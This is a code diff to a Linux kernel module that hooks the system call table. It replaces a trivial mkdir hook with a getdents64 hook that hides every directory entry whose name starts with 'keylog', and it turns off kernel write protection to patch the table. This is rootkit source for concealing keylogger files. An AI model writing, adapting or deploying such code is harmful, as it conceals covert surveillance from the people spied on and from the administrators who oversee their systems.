@@ -3,20 +3,62 @@
 #include <linux/kallsyms.h>
 #include <linux/kernel.h>
 #include <linux/kprobes.h>
+#include <linux/dirent.h>
 
 #include "include/sys_calls.h"
 
-typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
-typedef asmlinkage long (*mkdir_t)(const char *, mode_t);
-typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+#define FILENAME "keylog"
 
-static mkdir_t original_mkdir;
+typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+typedef asmlinkage long (*getdents_t)(const struct pt_regs *);
+
+static getdents_t orig_getdents64 = NULL;
 static unsigned long *syscall_table = NULL;
 
-static asmlinkage long hacked_mkdir(const char *path, mode_t mode) {
-	printk(KERN_INFO ":-)\n");
+asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
+	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
+	int ret = 0;
 
-	return 0;
+	struct linux_dirent64 *curr_dir = NULL;
+	struct linux_dirent64 *dirent_ker = NULL;
+	struct linux_dirent64 *prev_dir = NULL;
+	unsigned long offset = 0;
+
+	ret = orig_getdents64(regs);
+	dirent_ker = kzalloc(ret, GFP_KERNEL);
+
+	if (ret <= 0 || dirent_ker == NULL) {
+		return ret;
+	}
+
+	if (copy_from_user(dirent_ker, dirent, ret)) {
+		goto out;
+	}
+
+	while (offset < ret) {
+		curr_dir = (void *)dirent_ker + offset;
+
+		if (memcmp(FILENAME, curr_dir->d_name, strlen(FILENAME)) == 0) {
+			if (curr_dir == dirent_ker) {
+				ret -= curr_dir->d_reclen;
+				memmove(curr_dir, (void *)curr_dir + curr_dir->d_reclen, ret);
+				continue;
+			}
+			prev_dir->d_reclen += curr_dir->d_reclen;
+		} else {
+			prev_dir = curr_dir;
+		}
+		offset += curr_dir->d_reclen;
+	}
+
+	if (copy_to_user(dirent, dirent_ker, ret) != 0) {
+		goto out;
+	}
+
+out:
+	kfree(dirent_ker);
+	return ret;
 }
 
 static unsigned long *get_syscall_table(void) {
@@ -65,8 +107,8 @@ int sys_calls_init(void) {
 		rc = -1;
 		goto out;
 	}
-	original_mkdir = (mkdir_t)syscall_table[__NR_mkdir];
-	syscall_table[__NR_mkdir] = (sys_call_ptr_t)hacked_mkdir;
+	orig_getdents64 = (getdents_t)syscall_table[__NR_getdents64];
+	syscall_table[__NR_getdents64] = (long unsigned int)hooked_getdents64;
 
 out:
 	enable_write_protection();
@@ -76,7 +118,7 @@ out:
 void sys_calls_cleanup(void) {
 	disable_write_protection();
 
-	syscall_table[__NR_mkdir] = (sys_call_ptr_t)original_mkdir;
+	syscall_table[__NR_getdents64] = (long unsigned int)orig_getdents64;
 
 	enable_write_protection();
 }
